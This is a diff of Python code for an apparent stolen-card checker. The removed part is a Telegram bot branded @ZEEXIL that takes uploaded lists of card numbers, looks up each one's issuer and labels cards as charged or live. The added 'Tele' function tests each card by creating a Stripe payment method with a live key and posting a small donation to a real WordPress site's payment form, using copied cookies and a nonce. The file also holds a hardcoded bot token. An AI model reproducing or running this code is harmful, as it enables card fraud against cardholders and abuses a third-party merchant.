@@ -1,191 +1,78 @@
-import requests
-import telebot, time
-from telebot import types
-from gatet import Tele
-import os
-from datetime import datetime
+import requests, re
 
-token = '7808368963:AAHApbi-jKkj0D09VUBaiTwoR5wO1_zeSyY'
-bot = telebot.TeleBot(token, parse_mode="HTML")
-
-def format_card(cc):
-    """Clean and standardize card format to: NUMBER|MM|YY|CVV"""
-    cc = cc.strip()
-    # Replace any separators with pipe and remove spaces
-    for sep in [' ', ':', ';', ',', '/']:
-        cc = cc.replace(sep, '|')
-    # Split and clean parts
-    parts = [p.strip() for p in cc.split('|') if p.strip()]
-    # Ensure we have exactly 4 parts (number, month, year, cvv)
-    if len(parts) >= 4:
-        # Format year to 2 digits if it's 4
-        year = parts[2]
-        if len(year) == 4:
-            year = year[2:]
-        return f"{parts[0]}|{parts[1]}|{year}|{parts[3]}"
-    return cc  # Return original if format is invalid
-
-@bot.message_handler(commands=["start"])
-def start(message):
-    if not str(message.chat.id) == '1753137498':
-        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @ZEEXIL")
-        return
-    bot.reply_to(message, "Send the file now")
-
-@bot.message_handler(content_types=["document"])
-def main(message):
-    if not str(message.chat.id) == '1753137498':
-        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @ZEEXIL")
-        return
+def Tele(ccx):
+    import requests
+    ccx = ccx.strip()
+    n = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
     
-    stats = {
-        'dd': 0,
-        'ch': 0,
-        'ccn': 0,
-        'cvv': 0,
-        'lowfund': 0
+    if "20" in yy:  # Mo3gza
+        yy = yy.split("20")[1]
+    
+    r = requests.session()
+    
+    headers = {
+        'authority': 'api.stripe.com',
+        'accept': 'application/json',
+        'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
     }
     
-    ko = (bot.reply_to(message, "GOOD LUCK CHECKING...").message_id)
-    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F944bb046f5%3B+stripe-js-v3%2F944bb046f5%3B+card-element&key=pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
     
-    with open("combo.txt", "wb") as w:
-        w.write(ee)
+    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
     
-    try:
-        with open("combo.txt", 'r') as file:
-            lino = file.readlines()
-            total = len(lino)
-            processed = 0
-            
-            for cc in lino:
-                processed += 1
-                current_dir = os.getcwd()
-                for filename in os.listdir(current_dir):
-                    if filename.endswith(".stop"):
-                        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, 
-                                            text='STOP ✅\nBOT BY ➜ @ZEEXIL')
-                        os.remove('stop.stop')
-                        return
-                
-                # Format the card first
-                formatted_cc = format_card(cc)
-                try: 
-                    data = requests.get('https://bins.antipublic.cc/bins/'+formatted_cc[:6]).json()
-                except: 
-                    data = {}
-                
-                brand = data.get('brand', 'Unknown')
-                card_type = data.get('type', 'Unknown')
-                country = data.get('country_name', 'Unknown')
-                country_flag = data.get('country_flag', '💡')
-                bank = data.get('bank', 'Unknown')
-                current_time = datetime.now().strftime("%I:%M %p")
-                
-                start_time = time.time()
-                try:
-                    last = str(Tele(formatted_cc))
-                except Exception as e:
-                    print(e)
-                    last = 'API NOT RESPONSE'
-                
-                # Determine status and response
-                if 'Thank' in last:
-                    status = "✅ APPROVED"
-                    response = "Transaction successful 🔥"
-                    stats['ch'] += 1
-                    show_details = True
-                elif 'Your card does not support this type of purchase' in last:
-                    status = "🔥 LIVE"
-                    response = "CVV LIVE ✅"
-                    stats['cvv'] += 1
-                    show_details = True
-                elif 'security code is incorrect' in last:
-                    status = "🔥 LIVE"
-                    response = "CCN LIVE ✅"
-                    stats['ccn'] += 1
-                    show_details = True
-                elif 'insufficient funds' in last:
-                    status = "🔥 LIVE"
-                    response = "Insufficient funds 😢"
-                    stats['lowfund'] += 1
-                    show_details = True
-                elif 'Verifying strong customer authentication' in last:
-                    status = "🔥 LIVE"
-                    response = "CVV LIVE ✅"
-                    stats['cvv'] += 1
-                    show_details = True
-                else:
-                    status = "❌ DECLINED"
-                    response = "Card declined ❌"
-                    stats['dd'] += 1
-                    show_details = False
-                
-                # Progress message
-                message_text = f"""
-<b>🔍 ZEE CHECKING CARD</b>
-────────────────────
-<b>Card:</b> <code>{cc}</code>
-<b>Status:</b> <code>{status}</code>
-<b>Response:</b> <code>{response}</code>
-<b>Time:</b> <code>{current_time}</code>
-<b>Progress:</b> <code>{processed}/{total}</code>
-────────────────────
-"""
-                # Statistics buttons
-                markup = types.InlineKeyboardMarkup(row_width=2)
-                btn1 = types.InlineKeyboardButton(f"CHARGED: {stats['ch']}🔥", callback_data='x')
-                btn2 = types.InlineKeyboardButton(f"CVV: {stats['cvv']}✅", callback_data='x')
-                btn3 = types.InlineKeyboardButton(f"CCN: {stats['ccn']}✅", callback_data='x')
-                btn4 = types.InlineKeyboardButton(f"LOW FUNDS: {stats['lowfund']}😢", callback_data='x')
-                btn5 = types.InlineKeyboardButton(f"DECLINED: {stats['dd']}❌", callback_data='x')
-                btn6 = types.InlineKeyboardButton(f"TOTAL: {total}📊", callback_data='x')
-                stop_btn = types.InlineKeyboardButton("🛑 STOP", callback_data='stop')
-                markup.add(btn1, btn2, btn3, btn4, btn5, btn6, stop_btn)
-                
-                bot.edit_message_text(
-                    chat_id=message.chat.id,
-                    message_id=ko,
-                    text=message_text,
-                    reply_markup=markup
-                )
-                
-                # Detailed message for successful cards
-                if show_details:
-                    elapsed_time = round(time.time() - start_time, 1)
-                    detailed_msg = f"""
-<b>💳 ZEE CARD DETAILS</b>
-────────────────────
-<b>Card:</b> <code>{cc}</code>
-<b>Status:</b> <code>{status}</code>
-<b>Response:</b> <code>{response}</code>
-────────────────────
-<b>BIN:</b> <code>{formatted_cc[:6]}</code>-<code>{card_type.upper()}</code>
-<b>Brand:</b> <code>{brand.upper()}</code>
-<b>Bank:</b> <code>{bank.upper()}</code>
-<b>Country:</b> <code>{country.upper()}</code> - <code>{country_flag}</code>
-────────────────────
-<b>Time:</b> <code>{elapsed_time}s ⏱️</code>
-<b>Checked:</b> <code>{current_time}</code>
-<b>Bot:</b> @ZEEXIL
-"""
-                    bot.send_message(message.chat.id, detailed_msg)
-                
-                time.sleep(1)
+    pm = r1.json()['id']
     
-    except Exception as e:
-        print(e)
+    cookies = {
+        '__cf_bm': 'tYGL6a4UNQIIzY_kkQCTlEsGbbu8V4PRxK8K553eGXc-1740399658-1.0.1.1-G2vhUQpFMszc003ju73Oarafe.eMjg9gB0s.H.9y8rvxR_KRAwDRTiuiyxX5U8gH3ueV_Opl1guZVdeyiEMrDw',
+        '_fbp': 'fb.2.1740399662778.157652016478123277',
+        'cookieyes-consent': 'consentid:bzFQbnc3TUdrbTBTcWt0aG5lR2xsUXA4NE5IMFFEOWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
+        '_ga_59B60VWWYG': 'GS1.1.1740399662.1.0.1740399662.0.0.1057425111',
+        '_ga': 'GA1.1.1773205121.1740399663',
+        '__stripe_mid': '3ad59ee3-8640-4489-b958-19ff81a14c54f88403',
+        '__stripe_sid': '51e56c80-8e2d-45ed-bd84-11c08a6392b350060f',
+        '_gcl_au': '1.1.1127129083.1740399661.1033584891.1740399744.1740399744',
+    }
     
-    bot.edit_message_text(
-        chat_id=message.chat.id, 
-        message_id=ko, 
-        text='✅ CHECK COMPLETED\nBot by @ZEEXIL'
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data == 'stop')
-def menu_callback(call):
-    with open("stop.stop", "w") as file:
-        pass
-
-if __name__ == "__main__":
-    bot.polling()
+    headers = {
+        'authority': 'allcoughedup.com',
+        'accept': '*/*',
+        'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://allcoughedup.com',
+        'referer': 'https://allcoughedup.com/registry/',
+        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+    
+    params = {
+        't': '1758787034927',
+    }
+    
+    data = {
+        'data': '__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce=4a5bc5a030&_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=ZEE&email=ca.s.ton.g.v.a.y.didian.e%40gmail.com&custom-payment-amount=0.50&description=I%20love%20it&payment_method=stripe&__entry_intermediate_hash=2dca9b8ed82606eb178beecca9d0a034&__stripe_payment_method_id='+str(pm)+'',
+        'action': 'fluentform_submit',
+        'form_id': '4',
+    }
+    
+    r2 = requests.post('https://allcoughedup.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
+    
+    return str(r2.json())
